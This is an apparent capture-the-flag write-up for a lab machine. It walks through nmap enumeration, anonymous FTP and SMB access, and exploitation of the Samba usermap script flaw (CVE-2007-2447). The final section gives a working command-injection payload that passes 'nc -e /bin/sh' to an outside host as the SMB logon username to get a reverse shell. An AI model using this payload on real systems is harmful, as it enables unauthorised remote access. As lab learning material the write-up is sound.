# Enum

```sh
sudo nmap -A 10.10.10.3
```

```
...
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
...
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
...
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
...
Running (JUST GUESSING): Linux 2.4.X|2.6.X (92%)....
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# First Sight

- It is possible to access FTP by Anonymous User [[ftp]]
- The SSH port is accessible. It is worth verifying OpenSSH exploitation scripts.
- Samba enabled. Furthermore, ports 139 and 445 are open. It means this machine is likely WINDOWS OS that is later Windows 2000, or UNIX [[smb]]
- OS Detection shows the possibility that this machine's os is LINUX

# Gaining Access

## FTP

```sh
# connect ftp server
ftp 10.10.10.3
Username: Anonymous
```

```sh
ftp> ls
# No Results :(
```

It shows no folder. This approach is unlikely to succeed.

**It is noteworthy that other writeups search exploits for `vsftpd 2.3.4`. I did not come up with the idea.**

## SMB

```sh
# ls
smbclient --no-pass -L \\10.10.10.3
```

output:

```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
```

It looks nice at first sight.But it is unable to access ADMIN$ folder.So I accessed `tmp` folder.

```sh
smbclient --no-pass //10.10.10.3/tmp
smb: \> ls
  .                                   D        0  Fri Nov 25 06:24:15 2022
  ..                                 DR        0  Sat Oct 31 10:33:58 2020
  .ICE-unix                          DH        0  Fri Nov 25 01:19:32 2022
  vmware-root                        DR        0  Fri Nov 25 01:19:55 2022
  .X11-unix                          DH        0  Fri Nov 25 01:19:58 2022
  .X0-lock                           HR       11  Fri Nov 25 01:19:58 2022
  vgauthsvclog.txt.0                  R     1600  Fri Nov 25 01:19:30 2022
  5574.jsvc_up                        R        0  Fri Nov 25 01:20:35 2022
```

Is is not attractive......but downloaded all files in the tmp folder.

```
mask ""
recurse
prompt
mget *
```

Although the download process went well, the files contained no meaningful info.

Moving to next step: searching exploit.

```
searchsploit samba 3.0.20
```

By searching exploits, I reached out `CVE-2007-2447 - Samba usermap script`

### CVE-2007-2447

It causes by lack of validating user's input.

```c

// source/lib.username.c
if ( *cmd ) {
        char **qlines;
        pstring command;
        int numlines, ret, fd;

        pstr_sprintf( command, "%s \"%s\"", cmd, user );

        DEBUG(10,("Running [%s]\n", command));
        ret = smbrun(command, &fd);
        DEBUGADD(10,("returned [%d]\n", ret));

        if ( ret != 0 ) {
                if (fd != -1)
                        close(fd);
                return False;
        }
```

The function `smbrun` takes user's input as the first arugment (command) and send it to bash.
So it is possible to execute any command

We can use the following command after connct to the server by smbclient.

```
logon <username> <password>
```

```sh
smbclient --no-pass //10.10.10.3/tmp
# give a shell command as username, while the password is not important so leave it blank.
smb: \> logon "/=`nohup nc -e /bin/sh 10.10.16.3 443`" ""
```

Finally I got the reverse shell and the flag.
